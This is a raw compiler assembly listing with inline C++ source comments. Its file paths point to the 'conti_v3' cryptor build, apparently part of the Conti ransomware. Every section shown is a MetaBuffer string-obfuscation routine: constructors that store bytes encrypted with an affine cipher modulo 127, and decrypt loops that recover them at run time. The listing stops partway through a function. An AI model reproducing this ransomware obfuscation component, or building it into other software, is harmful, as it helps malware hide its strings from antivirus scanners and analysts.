?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 39	 sub	 ecx, 57			; 00000039H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 26	 mov	 BYTE PTR [rcx+1], 38	; 00000026H
  00007	c6 41 02 39	 mov	 BYTE PTR [rcx+2], 57	; 00000039H
  0000b	c6 41 03 45	 mov	 BYTE PTR [rcx+3], 69	; 00000045H
  0000f	c6 41 04 39	 mov	 BYTE PTR [rcx+4], 57	; 00000039H
  00013	c6 41 05 4d	 mov	 BYTE PTR [rcx+5], 77	; 0000004dH
  00017	c6 41 06 39	 mov	 BYTE PTR [rcx+6], 57	; 00000039H
  0001b	c6 41 07 5d	 mov	 BYTE PTR [rcx+7], 93	; 0000005dH
  0001f	c6 41 08 39	 mov	 BYTE PTR [rcx+8], 57	; 00000039H
  00023	c6 41 09 39	 mov	 BYTE PTR [rcx+9], 57	; 00000039H
  00027	c6 41 0a 39	 mov	 BYTE PTR [rcx+10], 57	; 00000039H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4c	 sub	 ecx, 76			; 0000004cH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 65	 mov	 BYTE PTR [rcx+1], 101	; 00000065H
  00007	c6 41 02 4c	 mov	 BYTE PTR [rcx+2], 76	; 0000004cH
  0000b	c6 41 03 6b	 mov	 BYTE PTR [rcx+3], 107	; 0000006bH
  0000f	c6 41 04 4c	 mov	 BYTE PTR [rcx+4], 76	; 0000004cH
  00013	c6 41 05 35	 mov	 BYTE PTR [rcx+5], 53	; 00000035H
  00017	c6 41 06 4c	 mov	 BYTE PTR [rcx+6], 76	; 0000004cH
  0001b	c6 41 07 4b	 mov	 BYTE PTR [rcx+7], 75	; 0000004bH
  0001f	c6 41 08 4c	 mov	 BYTE PTR [rcx+8], 76	; 0000004cH
  00023	c6 41 09 4c	 mov	 BYTE PTR [rcx+9], 76	; 0000004cH
  00027	c6 41 0a 4c	 mov	 BYTE PTR [rcx+10], 76	; 0000004cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 27	 sub	 ecx, 39			; 00000027H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 56	 mov	 BYTE PTR [rcx+1], 86	; 00000056H
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 10	 mov	 BYTE PTR [rcx+3], 16
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
  00013	c6 41 05 09	 mov	 BYTE PTR [rcx+5], 9
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 44	 mov	 BYTE PTR [rcx+7], 68	; 00000044H
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1e 00 00 00	 mov	 eax, 30
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5e	 mov	 BYTE PTR [rcx+1], 94	; 0000005eH
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 79	 mov	 BYTE PTR [rcx+3], 121	; 00000079H
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 3f	 mov	 BYTE PTR [rcx+5], 63	; 0000003fH
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 22	 mov	 BYTE PTR [rcx+7], 34	; 00000022H
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	c6 41 09 1e	 mov	 BYTE PTR [rcx+9], 30
  00027	c6 41 0a 1e	 mov	 BYTE PTR [rcx+10], 30
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 07 00 00 00	 mov	 eax, 7
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
